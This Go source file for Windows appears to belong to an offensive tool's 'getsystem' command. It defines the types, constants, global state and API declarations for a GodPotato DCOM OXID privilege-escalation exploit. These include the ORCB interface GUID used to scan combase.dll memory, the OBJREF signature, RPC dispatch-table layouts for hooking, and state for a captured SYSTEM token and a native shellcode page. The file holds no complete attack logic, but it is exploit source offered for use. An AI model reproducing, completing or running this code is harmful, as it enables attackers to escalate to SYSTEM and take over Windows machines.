//go:build windows
// +build windows

// getsystem_potato_types.go contains type definitions, constants, global state,
// and Windows API proc declarations used by the GodPotato DCOM OXID exploit.

package commands

import (
	"sync"

	"golang.org/x/sys/windows"
)

// orcbGUID is the ORCB RPC interface GUID (18f70770-8e64-11cf-9af1-0020af6e72f4)
// in little-endian byte order for memory scanning in combase.dll.
var orcbGUID = [16]byte{
	0x70, 0x07, 0xF7, 0x18, // Data1 LE
	0x64, 0x8E,             // Data2 LE
	0xCF, 0x11,             // Data3 LE
	0x9A, 0xF1, 0x00, 0x20, 0xAF, 0x6E, 0x72, 0xF4, // Data4
}

// OBJREF magic signature ("MEOW" in little-endian)
const objrefSignature = 0x574f454d

// OBJREF flags
const objrefStandard = 0x00000001

// COM IIDs
var iidIUnknown = [16]byte{
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
}

// potatoState holds the mutable state for the GodPotato technique
type potatoState struct {
	mu             sync.Mutex
	systemToken    windows.Token
	tokenCaptured  bool
	pipeName       string
	pipeUniqueName string
	hookError      string
	origFuncPtr    uintptr
	hookCalled     bool
	paramCount     int
	// Pre-computed DUALSTRINGARRAY bytes (built before hook install to avoid
	// fmt.Sprintf/allocations inside the RPC dispatch callback context)
	precomputedDSA []byte
	// iunknownRef prevents Go's GC from collecting the IUnknown COM object.
	// Without this, the object returned as uintptr could be GC'd while COM
	// still references it, causing an access violation crash.
	iunknownRef interface{}
	// shellcodePage is the VirtualAlloc'd page for the native hook shellcode.
	// Stored here so we can VirtualFree it during cleanup.
	shellcodePage uintptr
	// dsaHeapBuf is the HeapAlloc'd DSA buffer address embedded in shellcode.
	dsaHeapBuf uintptr
}

var potatoGlobal potatoState

// Windows API procs for COM and memory operations
var (
	ole32DLL              = windows.NewLazySystemDLL("ole32.dll")
	procCoInitializeEx    = ole32DLL.NewProc("CoInitializeEx")
	procCoUninitialize    = ole32DLL.NewProc("CoUninitialize")
	procCoUnmarshalIntf   = ole32DLL.NewProc("CoUnmarshalInterface")
	procCreateObjrefMonik = ole32DLL.NewProc("CreateObjrefMoniker")
	procCreateBindCtx     = ole32DLL.NewProc("CreateBindCtx")
	procCoTaskMemFree     = ole32DLL.NewProc("CoTaskMemFree")

	procVirtualQuery   = kernel32NP.NewProc("VirtualQuery")
	procGetProcessHeap = kernel32NP.NewProc("GetProcessHeap")
	procHeapAlloc      = kernel32NP.NewProc("HeapAlloc")
	// procGetModuleHandleW is declared in spawn.go
)

// RPC_SERVER_INTERFACE represents the RPC server interface structure in combase.dll
type rpcServerInterface struct {
	Length                  uint32
	InterfaceID             [20]byte // RPC_IF_ID = GUID (16) + Version (4)
	TransferSyntax          [20]byte
	DispatchTable           uintptr // *RPC_DISPATCH_TABLE
	RpcProtseqEndpointCount uint32
	RpcProtseqEndpoint      uintptr
	DefaultManagerEpv       uintptr
	InterpreterInfo         uintptr // *MIDL_SERVER_INFO
	Flags                   uint32
}

type rpcDispatchTable struct {
	DispatchTableCount uint32
	DispatchTable      uintptr // *funcptr array
	Reserved           uintptr
}

type midlServerInfo struct {
	StubDesc        uintptr
	DispatchTable   uintptr // *funcptr array — the manager routines
	ProcString      uintptr
	FmtStringOffset uintptr
}
